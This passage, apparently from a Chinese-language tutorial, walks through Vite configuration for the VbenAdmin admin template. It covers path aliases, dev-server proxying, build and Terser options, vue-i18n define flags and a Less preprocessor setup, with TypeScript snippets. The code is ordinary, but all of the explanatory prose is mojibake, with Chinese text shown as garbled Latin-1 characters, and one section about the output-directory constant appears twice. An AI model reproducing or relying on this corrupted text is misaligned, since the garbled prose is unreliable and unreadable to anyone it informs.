æ–‡ä»¶æ‰€åœ¨çš„ä½ç½®ï¼‰ã€‚å¯ä»¥æ˜¯ä¸€å€‹çµ•å°è·¯å¾‘ï¼Œæˆ–è€…ä¸€å€‹ç›¸å°æ–¼è©²é…ç½®æ–‡ä»¶æœ¬èº«çš„è·¯å¾‘ã€‚\næ›´å¤šä¿¡æ¯è©³è¦‹é …ç›®æ ¹ç›®éŒ„ã€‚\nç”¨ä¾†æ‰¾index.htmlè·¯å¾‘çš„é…ç½®å§ï¼Œäº‚å¯«å•Ÿå‹•é …ç›®çš„æ™‚å€™æœƒå ±éŒ¯ã€‚å…¶ä»–çš„ä¹Ÿä¸ç”¨è§£é‡‹äº†ã€‚\nViteé…ç½®-resolve.alias èªªæ˜ Viteé…ç½®-resolve.aliasèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼š 1 Record\u0026lt;string, string\u0026gt; | Array\u0026lt;{ find: string | RegExp, replacement: string }\u0026gt; å°‡æœƒè¢«å‚³éåˆ° @rollup/plugin-alias ä½œç‚ºå®ƒçš„ entriesã€‚ä¹Ÿå¯ä»¥æ˜¯ä¸€å€‹å°è±¡ï¼Œæˆ–ä¸€å€‹ { find, replacement } çš„æ•¸çµ„ã€‚\nç•¶ä½¿ç”¨æ–‡ä»¶ç³»çµ±è·¯å¾‘çš„åˆ¥åæ™‚ï¼Œè«‹å§‹çµ‚ä½¿ç”¨çµ•å°è·¯å¾‘ã€‚ç›¸å°è·¯å¾‘ä½œåˆ¥åå€¼å°‡æŒ‰åŸæ¨£ä½¿ç”¨å°è‡´ä¸æœƒè§£æåˆ°æ–‡ä»¶ç³»çµ±è·¯å¾‘ä¸­ã€‚\næ›´é«˜ç´šçš„è‡ªå®šç¾©è§£ææ–¹æ³•å¯ä»¥é€šé æ’ä»¶ å¯¦ç¾ã€‚\nVbenAdminçš„ç¤ºä¾‹ï¼š vite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 resolve: { alias: [ { // /@/xxxx =\u0026gt; src/xxx find: /^\\/@\\//, replacement: pathResolve(\u0026#39;src\u0026#39;) + \u0026#39;/\u0026#39;, }, { // /#/xxxx =\u0026gt; types/xxx find: /^\\/#\\//, replacement: pathResolve(\u0026#39;types\u0026#39;) + \u0026#39;/\u0026#39;, }, ], }, Viteé…ç½®-server.port èªªæ˜ Viteé…ç½®-server.portèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼š number æŒ‡å®šæœå‹™å™¨ç«¯å£ã€‚æ³¨æ„ï¼šå¦‚æœç«¯å£å·²ç¶“è¢«ä½¿ç”¨ï¼ŒVite æœƒè‡ªå‹•å˜—è©¦ä¸‹ä¸€å€‹å¯ç”¨çš„ç«¯å£ï¼Œæ‰€ä»¥é€™å¯èƒ½ä¸æ˜¯æœå‹™å™¨æœ€çµ‚ç›£è½çš„å¯¦éš›ç«¯å£ã€‚\nViteé…ç½®-server.proxy èªªæ˜ Viteé…ç½®-server.proxyèªªæ˜ Viteå…§ç½®çš„ä»£ç†æ’ä»¶http-proxyçš„Gité¦–é  http-proxyçš„é…ç½®é … å®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼š 1 Record\u0026lt;string, string | ProxyOptions\u0026gt; ç‚ºé–‹ç™¼æœå‹™å™¨é…ç½®è‡ªå®šç¾©ä»£ç†è¦å‰‡ã€‚æœŸæœ›æ¥æ”¶ä¸€å€‹ { key: options } å°è±¡ã€‚å¦‚æœ key å€¼ä»¥ ^ é–‹é ­ï¼Œå°‡æœƒè¢«è§£é‡‹ç‚º RegExpã€‚\nä½¿ç”¨ http-proxyã€‚å®Œæ•´é¸é …è©³è¦‹ æ­¤è™•ã€‚\nç¤ºä¾‹ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 export default { server: { proxy: { // å­—ç¬¦ä¸²ç°¡å¯«å¯«æ³• \u0026#39;/foo\u0026#39;: \u0026#39;http://localhost:4567/foo\u0026#39;, // é¸é …å¯«æ³• \u0026#39;/api\u0026#39;: { target: \u0026#39;http://jsonplaceholder.typicode.com\u0026#39;, changeOrigin: true, rewrite: (path) =\u0026gt; path.replace(/^\\/api/, \u0026#39;\u0026#39;) }, // æ­£å‰‡è¡¨é”å¼å¯«æ³• \u0026#39;^/fallback/.*\u0026#39;: { target: \u0026#39;http://jsonplaceholder.typicode.com\u0026#39;, changeOrigin: true, rewrite: (path) =\u0026gt; path.replace(/^\\/fallback/, \u0026#39;\u0026#39;) } } } } VbenAdminä»£ç¢¼è§£æ æˆ‘å€‘åœ¨buildæ–‡ä»¶å¤¾ä¸‹å‰µå»ºä¸€å€‹viteæ–‡ä»¶ï¼Œé€™éº¼æ”¾ç½®æ‰€æœ‰å’Œviteé…ç½®æœ‰é—œçš„æ–‡ä»¶ã€‚ç„¶å¾Œå®Œæˆæœ¬ç« å…©å€‹æ–‡ä»¶çš„ç·¨å¯«ã€‚\nproxy.ts build\\vite\\proxy.tsï¼Œæ³¨æ„ï¼Œé€™è£¡å¸¶è¨»è§£çš„ä»£ç¢¼å’ŒåŸä»£ç¢¼ä¸ä¸€æ¨£ã€‚å› ç‚ºåŸä»£ç¢¼æˆ‘æ„Ÿè¦ºæœ‰é»å•é¡Œã€‚\nViteå®˜æ–¹æ–‡æª”èªªä»£ç†é…ç½®æ¥æ”¶çš„æ˜¯ä¸€å€‹Record\u0026lt;string, string | ProxyOptions\u0026gt;å°è±¡ã€‚è€Œé€™å€‹æ–‡ä»¶çš„ä¸»è¦æ–¹æ³•è¿”å›çš„æ˜¯ProxyTargetListé¡å‹çš„å°è±¡ã€‚\næŒ‰ç†ä¾†èªªProxyTargetListæ‡‰è©²ç›´æ¥ç­‰æ–¼Record\u0026lt;string, string | ProxyOptions\u0026gt;ã€‚\nä½†æ˜¯VbenAminçš„ä»£ç¢¼å®‰è£äº†ä¸€å€‹@types/http-proxyï¼ˆé›–ç„¶Viteæœ¬èº«çš„ä»£ç†å°±æ˜¯ç”¨http-proxyå¯¦ç¾çš„ï¼‰çš„é–‹ç™¼ä¾è³´ã€‚ç„¶å¾Œå¾é€™å€‹é–‹ç™¼ä¾è³´è£¡é¢å°å…¥ä¸€å€‹ServerOptionsã€‚è®“ProxyTargetListç­‰æ–¼Record\u0026lt;string, ServerOptions \u0026amp; { rewrite: (path: string) =\u0026gt; string }\u0026gt;ã€‚\nå€‹äººæ„Ÿè¦ºå¯ä»¥ç›´æ¥ä½¿ç”¨viteæä¾›çš„é¡å‹å³å¯ï¼Œä¸ç”¨å®‰è£@types/http-proxyçš„è²æ˜æ–‡ä»¶ã€‚\nä»£ç¢¼ è¢«ä»£ç†ä¹‹å¾Œï¼Œè¨ªå•çš„è·¯å¾‘æ˜¯ ä»£ç†è‡³çš„è·¯å¾‘ + è¨ªå•çš„è·¯å¾‘å»æ‰æ ¹è·¯å¾‘å¾Œç¶“érewriteè™•ç†çš„è·¯å¾‘ã€‚\nbuild/vite/proxy.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 /** * .env.development çš„ ä»£ç†é…ç½® */ import type { ProxyOptions } from \u0026#39;vite\u0026#39;; // â†“ ç¬¬ä¸€é¡¹è¢«ä»£ç†çš„è·¯å¾„ï¼Œç¬¬äºŒé¡¹ä»£ç†è‡³çš„è·¯å¾„ type ProxyItem = [string, string]; // â†“ æ–¹æ³•æ¥æ”¶çš„å‚æ•° type ProxyList = ProxyItem[]; // â†“ Viteä»£ç†æ‰€æ¥æ”¶å¯¹è±¡ç±»å‹ type ProxyTargetList = Record\u0026lt;string, string | ProxyOptions\u0026gt;; // â†“ httpsç±»å‹çš„URLçš„åŒ¹é…æ­£åˆ™ const httpsRE = /^https:\\/\\//; /** * ç”ŸæˆViteä»£ç†é…ç½®çš„æ–¹æ³• */ export function createProxy(list: ProxyList = []) { const ret: ProxyTargetList = {}; for (const [prefix, target] of list) { const isHttps = httpsRE.test(target); // https://github.com/http-party/node-http-proxy#options ret[prefix] = { // â†“ ä»£ç†è‡³çš„è·¯å¾„ target: target, // â†“ é»˜è®¤å€¼ï¼šfalse-å°†ä¸»æœºæ ‡å¤´çš„æ¥æºæ›´æ”¹ä¸ºç›®æ ‡URL changeOrigin: true, // â†“ å¦‚æœæ‚¨æƒ³ä»£ç†websocket ws: true, rewrite: (path) =\u0026gt; path.replace(new RegExp(`^${prefix}`), \u0026#39;\u0026#39;), // https is require secure=false ...(isHttps ? { secure: false } : {}), }; } return ret; } vite.config.ts ç›´æ¥å°‡ä¸Šé¢å®šç¾©çš„ç”Ÿæˆä»£ç†é…ç½®çš„æ–¹æ³•æ”¾åˆ°vite.config.tsä¸­ä½¿ç”¨ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // ... import { createProxy } from \u0026#39;./build/vite/proxy\u0026#39;; // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... server: { // ... // å¾.envåŠ è¼‰ä»£ç†é…ç½® proxy: createProxy(VITE_PROXY), }, // ... }; }; Viteé…ç½®-server.hmr èªªæ˜ Viteé…ç½®-server.hmrèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼š 1 boolean | { protocol?: string, host?: string, port?: number, path?: string, timeout?: number, overlay?: boolean } ç¦ç”¨æˆ–é…ç½® HMR é€£æ¥ï¼ˆç”¨æ–¼ HMR websocket å¿…é ˆä½¿ç”¨ä¸åŒçš„ http æœå‹™å™¨åœ°å€çš„æƒ…æ³ï¼‰ã€‚\nè¨­ç½® server.hmr.overlay ç‚º false å¯ä»¥ç¦ç”¨æœå‹™å™¨éŒ¯èª¤é®ç½©å±¤ã€‚\né€™å€‹å°±æ˜¯é…ç½®Viteçš„ç†±æ›´æ–°çš„ã€‚æ–‡æª”ä¸­èªªçš„æœå‹™å™¨éŒ¯èª¤é®ç½©å±¤ï¼Œå°±æ˜¯ä½ åœ¨ä»£ç¢¼ä¸­ç·¨å¯«ç·¨å¯«éŒ¯èª¤çš„ä»£ç¢¼ï¼Œç·¨è­¯ä¸é€šéçš„æ™‚å€™ï¼Œç€è¦½å™¨é é¢ä¹ŸæœƒåŒæ™‚å±•ç¤ºä¸€å€‹ç°å±ä¸Šé¢é¡¯ç¤ºä½ çš„ä»£ç¢¼éŒ¯èª¤ã€‚\nViteé…ç½®-build.minify èªªæ˜ Viteé…ç½®-build.minifyèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼š 1 boolean | \u0026#39;terser\u0026#39; | \u0026#39;esbuild\u0026#39; é»˜èªï¼šterser è¨­ç½®ç‚º false å¯ä»¥ç¦ç”¨æœ€å°åŒ–æ··æ·†ï¼Œæˆ–æ˜¯ç”¨ä¾†æŒ‡å®šä½¿ç”¨å“ªç¨®æ··æ·†å™¨ã€‚é»˜èªç‚º Terserï¼Œé›–ç„¶ Terser ç›¸å°è¼ƒæ…¢ï¼Œä½†å¤§å¤šæ•¸æƒ…æ³ä¸‹æ§‹å»ºå¾Œçš„æ–‡ä»¶é«”ç©æ›´å°ã€‚ ESbuild æœ€å°åŒ–æ··æ·†æ›´å¿«ä½†æ§‹å»ºå¾Œçš„æ–‡ä»¶ç›¸å°æ›´å¤§ã€‚\nViteé…ç½®-build.outDir èªªæ˜ Viteé…ç½®-build.outDirèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼šstring é»˜èªï¼šdist æŒ‡å®šè¼¸å‡ºè·¯å¾‘ï¼ˆç›¸å°æ–¼ é …ç›®æ ¹ç›®éŒ„)ã€‚\nå‰µå»ºå…¨å±€å¸¸æ•¸ é€™å€‹è¼¸å‡ºè·¯å¾‘æˆ‘å€‘æŠŠå®ƒå¯«æˆä¸€å€‹å…¨å±€å¸¸é‡ã€‚å…¨å±€å¸¸é‡ä¿å­˜åœ¨ï¼šbuild\\constant.ts\nbuild\\constant.ts 1 2 3 4 5 6 /** * åœ¨ç”Ÿäº§ç¯å¢ƒä¸­è¾“å…¥çš„é…ç½®æ–‡ä»¶åç§°ã€‚ */ export const GLOB_CONFIG_FILE_NAME = \u0026#39;_app.config.js\u0026#39;; export const OUTPUT_DIR = \u0026#39;dist\u0026#39;; ç„¶å¾Œåœ¨vite.config.tsä¸­å¼•ç”¨ï¼š\nvite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // ... import { OUTPUT_DIR } from \u0026#39;./build/constant\u0026#39;; // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... build: { outDir: OUTPUT_DIR, }, // ... }; }; Viteé…ç½®-build.polyfillDynamicImport èªªæ˜ Viteé…ç½®-build.polyfillDynamicImportèªªæ˜ æ“æŠ±Vite2.0 ç³»åˆ—ï¼ˆäºŒï¼‰ - çŸ¥ä¹ å®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼šboolean é»˜èªï¼štrueï¼Œé™¤ébuild.targetæ˜¯esnextã€‚ æ˜¯å¦è‡ªå‹•æ³¨å…¥å‹•æ…‹å°å…¥polyfillã€‚\npolyfillæœƒè‡ªå‹•æ³¨å…¥åˆ°æ¯å€‹index.htmlæ¢ç›®çš„ä»£ç†æ¨¡å¡Šä¸­ã€‚å¦‚æœé€šébuild.rollupOptions.inputé…ç½®æˆä½¿ç”¨éhtmlçš„è‡ªå®šç¾©æ¢ç›®ï¼Œé‚£éº¼å°±éœ€è¦æ‰‹å‹•å°å…¥è‡ªå®šç¾©æ¢ç›®ä¸­çš„polyfillï¼š\n1 import \u0026#39;vite/dynamic-import-polyfill\u0026#39; æ³¨æ„ï¼špolyfillä¸é©ç”¨æ–¼åº«æ¨¡å¼ã€‚å¦‚æœä½ éœ€è¦æ”¯æŒæ²’æœ‰æœ¬åœ°å‹•æ…‹å°å…¥çš„ç€è¦½å™¨ï¼Œä½ å¯èƒ½æ‡‰è©²é¿å…åœ¨ä½ çš„åº«ä¸­ä½¿ç”¨å®ƒã€‚\nViteä½¿ç”¨ESå‹•æ…‹å°å…¥ä½œç‚ºä»£ç¢¼åˆ†å‰²é»ã€‚ç”Ÿæˆçš„ä»£ç¢¼é‚„å°‡ä½¿ç”¨å‹•æ…‹å°å…¥ä¾†åŠ è¼‰ç•°æ­¥å¡Šã€‚ç„¶è€Œï¼Œæœ¬æ©ŸESMå‹•æ…‹å°å…¥æ”¯æŒæ˜¯åœ¨ESMä¹‹å¾Œé€šéè…³æœ¬æ¨™è¨˜å¯¦ç¾çš„ï¼Œä¸¦ä¸”é€™å…©å€‹ç‰¹æ€§åœ¨ç€è¦½å™¨æ”¯æŒæ–¹é¢å­˜åœ¨å·®ç•°ã€‚ Viteæœƒè‡ªå‹•æ³¨å…¥ä¸€å€‹è¼•é‡ç´šçš„å‹•æ…‹å°å…¥å¡«å……ä¾†æ¶ˆé™¤é€™ç¨®å·®ç•°ã€‚\nå¦‚æœä½ çŸ¥é“ä½ çš„ç›®æ¨™ç€è¦½å™¨åªæ”¯æŒæœ¬æ©Ÿå‹•æ…‹å°å…¥ï¼Œä½ å¯ä»¥é€šébuild.polyfillDynamicImporté¡¯å¼ç¦ç”¨æ­¤ç‰¹æ€§ã€‚\nç¸½ä¹‹VbenAdminä¸­åœ¨ç”Ÿç”¢ç’°å¢ƒå°‡æ­¤é …ç¦ç”¨äº†ã€‚å¦‚æœæ‰“åŒ…å¾Œçš„é …ç›®æœ‰å•é¡Œï¼Œè€Œæœ¬åœ°é‹è¡Œæ²’å•é¡Œã€‚é‚£éº¼å˜—è©¦æ‰“é–‹å®ƒï¼Œå› ç‚ºé€™å€‹é…ç½®è²Œä¼¼å’Œç€è¦½å™¨æœ‰é—œã€‚\nå‰µå»ºå…¨å±€å¸¸æ•¸ é€™å€‹è¼¸å‡ºè·¯å¾‘æˆ‘å€‘æŠŠå®ƒå¯«æˆä¸€å€‹å…¨å±€å¸¸é‡ã€‚å…¨å±€å¸¸é‡ä¿å­˜åœ¨ï¼šbuild\\constant.ts\nbuild\\constant.ts 1 2 3 4 5 6 /** * åœ¨ç”Ÿäº§ç¯å¢ƒä¸­è¾“å…¥çš„é…ç½®æ–‡ä»¶åç§°ã€‚ */ export const GLOB_CONFIG_FILE_NAME = \u0026#39;_app.config.js\u0026#39;; export const OUTPUT_DIR = \u0026#39;dist\u0026#39;; ç„¶å¾Œåœ¨vite.config.tsä¸­å¼•ç”¨ï¼š\nvite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // ... import { OUTPUT_DIR } from \u0026#39;./build/constant\u0026#39;; // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... build: { outDir: OUTPUT_DIR, }, // ... }; }; Viteé…ç½®-build.terserOptions èªªæ˜ Viteé…ç½®-build.terserOptionsèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼šTerserOptions å‚³éçµ¦ Terser çš„æ›´å¤š minify é¸é …ã€‚\nå…¶ä»–çš„é…ç½®é …è‡ªè¡Œç ”ç©¶ï¼Œé€™è£¡åªè¨»é‡‹ä¸€ä¸‹VbenAdminé…ç½®çš„ä»£ç¢¼ã€‚\nvite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... build: { // ... terserOptions: { compress: { keep_infinity: true, // ç”¨æ–¼åˆªé™¤ç”Ÿç”¢ç’°å¢ƒä¸­çš„console drop_console: VITE_DROP_CONSOLE, }, }, }, // ... }; }; compressï¼šï¼ˆé»˜èª{}ï¼‰-é€šéfalseä»¥å®Œå…¨è·³éå£“ç¸®ã€‚å‚³éä¸€å€‹å°åƒä»¥æŒ‡å®šè‡ªå®šç¾©å£“ç¸®é¸é …ã€‚ compress.keep_infinityï¼šï¼ˆé»˜èªå€¼ï¼šfalseï¼‰-é€šétrueä»¥é˜²æ­¢Infinityè¢«å£“ç¸®ç‚º1/0ï¼Œé€™å¯èƒ½æœƒå°è‡´Chromeå‡ºç¾æ€§èƒ½å•é¡Œã€‚ compress.drop_consoleï¼šï¼ˆé»˜èªå€¼ï¼šfalseï¼‰-å‚³étrueä»¥æ”¾æ£„å°console.*å‡½æ•¸çš„èª¿ç”¨ ã€‚å¦‚æœæ‚¨å¸Œæœ›åœ¨åˆªé™¤å‡½æ•¸èª¿ç”¨å¾Œåˆªé™¤ç‰¹å®šçš„å‡½æ•¸èª¿ç”¨ï¼Œä¾‹å¦‚console.infoå’Œ/æˆ–ä¿ç•™å‡½æ•¸è‡ªè®Šé‡çš„å‰¯ä½œç”¨ï¼Œè«‹pure_funcsæ”¹ç”¨ã€‚ Viteé…ç½®-build.brotliSize èªªæ˜ Viteé…ç½®-build.brotliSizeèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼šboolean é»˜èªï¼štrue å•Ÿç”¨/ç¦ç”¨ brotli å£“ç¸®å¤§å°å ±å‘Šã€‚å£“ç¸®å¤§å‹è¼¸å‡ºæ–‡ä»¶å¯èƒ½æœƒå¾ˆæ…¢ï¼Œå› æ­¤ç¦ç”¨è©²åŠŸèƒ½å¯èƒ½æœƒæé«˜å¤§å‹é …ç›®çš„æ§‹å»ºæ€§èƒ½ã€‚\nç¦ç”¨å°±å¥½ã€‚\næ•ˆæœå°æ¯” æ‰“é–‹å£“ç¸®å ±å‘Šï¼š4.90s\né—œé–‰å£“ç¸®å ±å‘Šï¼š3.50sï¼Œå°‘äº†å¾Œé¢ä¸€ä¸²å£“ç¸®å¤§å°ï¼Œè‚¯å®šæ›´å¿«å•¦ã€‚\nViteé…ç½®-build.chunkSizeWarningLimit èªªæ˜ Viteé…ç½®-build.chunkSizeWarningLimitèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼šnumber é»˜èªï¼š500 chunk å¤§å°è­¦å‘Šçš„é™åˆ¶ï¼ˆä»¥ kbs ç‚ºå–®ä½ï¼‰ã€‚\nLimitChunkCountPlugin\nåœ¨ç·¨å¯«ä»£ç¢¼æ™‚ï¼Œæ‚¨å¯èƒ½å·²ç¶“æ·»åŠ äº†è¨±å¤šä»£ç¢¼æ‹†åˆ†é»ä»¥æŒ‰éœ€åŠ è¼‰å…§å®¹ã€‚ç·¨è­¯å¾Œï¼Œæ‚¨å¯èƒ½æœƒæ³¨æ„åˆ°ä¸€äº›å¡Šå¤ªå°äº†-é€ æˆæ›´å¤§çš„HTTPé–‹éŠ·ã€‚ LimitChunkCountPluginå¯ä»¥é€šéåˆä½µä¾†å°æ‚¨çš„å¡Šé€²è¡Œå¾Œè™•ç†ã€‚\nViteé…ç½®-define èªªæ˜ Viteé…ç½®-defineèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼š 1 Record\u0026lt;string, string\u0026gt; å®šç¾©å…¨å±€è®Šé‡æ›¿æ›æ–¹å¼ã€‚æ¯é …åœ¨é–‹ç™¼æ™‚æœƒè¢«å®šç¾©ç‚ºå…¨å±€è®Šé‡ï¼Œè€Œåœ¨æ§‹å»ºæ™‚å‰‡æ˜¯éœæ…‹æ›¿æ›ã€‚\nå¾ 2.0.0-beta.70 ç‰ˆæœ¬é–‹å§‹ï¼Œå­—ç¬¦ä¸²å€¼å°‡ä½œç‚ºä¸€å€‹ç›´æ¥çš„è¡¨é”å¼ï¼Œæ‰€ä»¥å¦‚æœå®šç¾©ç‚ºäº†ä¸€å€‹å­—ç¬¦ä¸²å¸¸é‡ï¼Œå®ƒéœ€è¦è¢«é¡¯å¼åœ°å¼•ç”¨ï¼ˆä¾‹å¦‚ï¼šé€šé JSON.stringifyï¼‰ã€‚ æ›¿æ›åªæœƒåœ¨åŒ¹é…åˆ°å‘¨åœæ˜¯å–®è©é‚Šç•Œï¼ˆ\\bï¼‰æ™‚åŸ·è¡Œã€‚ ä½¿ç”¨ çœ‹ä¸€ä¸‹vue-i18nçš„æ‡‰ç”¨ã€‚\nvue-i18nçš„å…¨å±€è®Šé‡æ›¿æ›\nåŸæ–‡ï¼š\nBundler æ§‹å»ºåŠŸèƒ½æ¨™èªŒ\nesm-bundler buildsç¾åœ¨æš´éœ²äº†å…¨å±€ç‰¹æ€§æ¨™èªŒï¼Œé€™äº›æ¨™èªŒå¯ä»¥åœ¨ç·¨è­¯æ™‚è¢«è¦†è“‹ã€‚\n__VUE_I18N_FULL_INSTALL__ï¼šå•Ÿç”¨/ç¦ç”¨ï¼Œé™¤äº†vue-i18n APIsï¼Œçµ„ä»¶å’ŒæŒ‡ä»¤éƒ½å®Œå…¨æ”¯æŒå®‰è£ï¼štrue\n__VUE_I18N_LEGACY_API__ï¼šå•Ÿç”¨/ç¦ç”¨vue-i18nå‚³çµ±é¢¨æ ¼çš„APIæ”¯æŒï¼Œé»˜èªç‚ºtrue\n__INTLIFY_PROD_DEVTOOLS__ï¼šåœ¨ç”Ÿç”¢ä¸­å•Ÿç”¨/ç¦ç”¨intlify-devtoolså’Œvue-devtoolsæ”¯æŒï¼Œé»˜èªç‚ºfalse\nåœ¨æ²’æœ‰é…ç½®é€™äº›æ¨™èªŒçš„æƒ…æ³ä¸‹ï¼Œç·¨è­¯ä¹Ÿèƒ½æ­£å¸¸å·¥ä½œï¼Œä½†å¼·çƒˆå»ºè­°æ­£ç¢ºé…ç½®é€™äº›æ¨™èªŒï¼Œä»¥ä¾¿åœ¨æœ€çµ‚çš„bundleä¸­ç²å¾—æ­£ç¢ºçš„æ¨¹å½¢æ–å‹•ã€‚\nè¦é…ç½®é€™äº›æ¨™èªŒï¼š\nwebpack: ä½¿ç”¨ DefinePlugin Rollup: ä½¿ç”¨ @rollup/plugin-replace Viteï¼šé»˜èªé…ç½®ï¼Œä½†å¯ä»¥ä½¿ç”¨defineé¸é …è¦†è“‹ æ³¨æ„ï¼šæ›¿æ›å€¼å¿…é ˆæ˜¯å¸ƒçˆ¾æ–‡ï¼Œä¸èƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œå¦å‰‡bundler/minifierå°‡ç„¡æ³•æ­£ç¢ºè©•ä¼°æ¢ä»¶ã€‚\nå¦‚æ­¤ï¼Œå°±æŒ‰ç…§VbenAdminçš„åŸä»£ç¢¼ä¸€æ¨£é…ç½®å§ã€‚ä¸ç„¶vue-i18né‚„æœƒåŒ…è­¦å‘Šï¼Œç•¶ç„¶ï¼Œç¾åœ¨æˆ‘å€‘é‚„æ²’æœ‰å®‰è£vue-i18nã€‚å¾Œé¢é…ç½®åœ‹éš›åŒ–çš„æ™‚å€™å†è¬›ã€‚\nViteé…ç½®-css.preprocessorOptions èªªæ˜ Viteé…ç½®-css.preprocessorOptionsèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼š 1 Record\u0026lt;string, object\u0026gt; æŒ‡å®šå‚³éçµ¦ CSS é è™•ç†å™¨çš„é¸é …ã€‚ä¾‹å¦‚ï¼š\nvite.config.ts 1 2 3 4 5 6 7 8 9 export default { css: { preprocessorOptions: { scss: { additionalData: `$injectedColor: orange;` } } } } å®‰è£less çœ¾æ‰€å‘¨çŸ¥Antdæ¡†æ¶ä½¿ç”¨çš„æ˜¯lessã€‚æ‰€ä»¥æˆ‘å€‘é€™è£¡ç ”ç©¶lessçš„é…ç½®ã€‚\nå®‰è£lessï¼š\n1 yarn add less --dev VbenAdminçš„å…¨å±€æ¨£å¼ åœ¨æ ¹ç›®éŒ„ä¸‹çš„ï¼šsrc\\designæ–‡ä»¶å¤¾ä¸­å®šç¾©äº†VbenAdminæ‰€æœ‰ å…¨å±€æ¨£å¼ å’Œ å…¨å±€lessè®Šé‡ ã€‚å…¶ä¸­åˆ†ç‚ºå…©å¤§é¡ï¼š\nsrc\\design\\index.lessï¼šå…¨å±€æ¨£å¼ï¼Œåœ¨main.tsä¸­ä½¿ç”¨ã€‚ src\\design\\config.lessï¼šå…¨å±€è®Šé‡ï¼Œåœ¨vite.config.tsä¸­ä½¿ç”¨ã€‚ è‡³æ–¼è©²æ–‡ä»¶å¤¾ä¸‹çš„å…¶ä»–æ–‡ä»¶ï¼Œéƒ½è¢«ç›´æ¥æˆ–é–“æ¥çš„å¼•å…¥åˆ°äº†index.lessã€config.lessä¸­ã€‚\næˆ‘å€‘é€™é‚Šç›´æ¥æ‹·è²æ–‡ä»¶å¤¾å°±è¡Œäº†ï¼Œæ¨£å¼ä¹Ÿæ²’å•¥ç ”ç©¶çš„ã€‚å¦‚æœæœ‰èƒ½åŠ›çš„å¯ä»¥æŠŠå’Œindex.lessç›¸é—œçš„æ–‡ä»¶éƒ½åˆªé™¤äº†ï¼Œç„¶å¾Œè‡ªå·±å¯«é—œæ–¼VbenAdminçš„æ¨£å¼ã€‚\nä½†æ˜¯è®Šé‡ä¸èƒ½å‹•ï¼Œå¾ˆå¤šéƒ½antdçš„è®Šé‡ï¼Œantd çš„ less è®Šé‡åƒè€ƒé€£çµã€‚\nè¤‡è£½å®Œä¹‹å¾Œï¼Œé †ä¾¿å°‡index.lessåœ¨main.tsä¸­å¼•ç”¨ä¸€ä¸‹ã€‚\nViteä¸­çš„Lessé…ç½® ä»£ç¢¼é…ç½® 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... css: { preprocessorOptions: { less: { modifyVars: { // ç”¨æ–¼å…¨å±€å°å…¥ï¼Œä»¥é¿å…éœ€è¦å–®ç¨å°å…¥æ¯å€‹æ¨£å¼æ–‡ä»¶ã€‚ // reference: é¿å…é‡è¤‡å¼•ç”¨ hack: `true; @import (reference) \u0026#34;${resolve(\u0026#39;src/design/config.less\u0026#39;)}\u0026#34;;`, // â†“ é€™è¡Œä»£ç¢¼ä¸‹ä¸€ç« è¬› // ...generateModifyVars(), }, javascriptEnabled: true, }, }, }, // ... }; }; ä»£ç¢¼è§£æ less-@importè¦å‰‡ less-å‘½ä»¤è¡Œèªæ³• lessjs-é…ç½®é … lessjs-é…ç½®é …-javascriptEnabled \u0026amp; modifyVars less-referenceå¤–æ–‡åšå®¢ css hackåŒ¯ç¸½ å²ä¸Šæœ€å…¨çš„CSS hackæ–¹å¼ä¸€è¦½ é—œæ–¼Less jsçš„@importå¯¦é©— lesså°æ‡‰çš„å°è±¡å¯ä»¥æŸ¥çœ‹lessjs-é…ç½®é …ã€‚\njavascriptEnabled: trueé€™è¡Œä»£ç¢¼æ²’å¾—èªªï¼Œç•¢ç«Ÿantdçš„lessæ–‡ä»¶ä¸­ä½¿ç”¨JSå¯«æ³•ï¼Œæ¯”å¦‚ï¼š\\node_modules\\ant-design-vue\\lib\\style\\color\\bezierEasing.less modifyVarsæ˜¯åœ¨å…¨å±€lessæ–‡ä»¶å¾Œé¢æ·»åŠ è®Šé‡çš„é…ç½®ã€‚ modifyVarså°æ‡‰çš„å°è±¡å±¬æ€§åæœƒåŠ ä¸Š@è¿½åŠ åˆ°lessæ–‡ä»¶å¾Œã€‚ hack: true; @import (r...ï¼šé€™ä¸€è¡Œä»£ç¢¼ï¼Œåœ¨lessæ–‡ä»¶ä¸­æœƒè¢«è§£ææˆï¼š 1 @hack=true; @import (reference) \u0026#34;${resolve(\u0026#39;src/design/config.less\u0026#39;)}\u0026#34;; é‚£é€™å€‹hackè®Šé‡æ˜¯å¹¹ä»€éº¼çš„ï¼Ÿæˆ‘æ„Ÿè¦ºå•¥ä¹Ÿæ²’æœ‰ï¼Œå–®ç´”æ˜¯ç‚ºäº†å°‡å¾Œé¢çš„@importæ¥ä¸Šçš„@importæœƒå 